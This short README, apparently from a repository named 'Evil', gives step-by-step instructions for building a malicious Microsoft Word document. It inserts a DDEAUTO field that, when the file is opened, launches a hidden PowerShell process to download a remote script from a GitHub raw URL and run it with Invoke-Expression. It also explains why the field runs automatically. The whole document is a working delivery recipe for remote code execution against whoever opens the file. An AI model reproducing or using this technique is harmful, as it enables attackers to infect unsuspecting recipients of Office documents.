# Evil
MS Word
Insert tab -> Quick Parts -> Field
Choose = (Formula) and click ok.
After that, you should see a Field inserted in the document with an error “!Unexpected End of Formula”, right-click the Field, and choose Toggle Field Codes.
The Field Code should now be displayed, change it to Contain the following:
{DDEAUTO c:\\Windows\\System32\\cmd.exe "/c powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Doc0160/Evil/master/evil.ps1'); Invoke-Expression $e"}
The DDEAUTO keyword is to inform MSWord that this is a DDE field, and will auto execute when the document is opened, the second part is the full path of the executable to execute, and the last part between quotes are the arguments to pass to this executable.
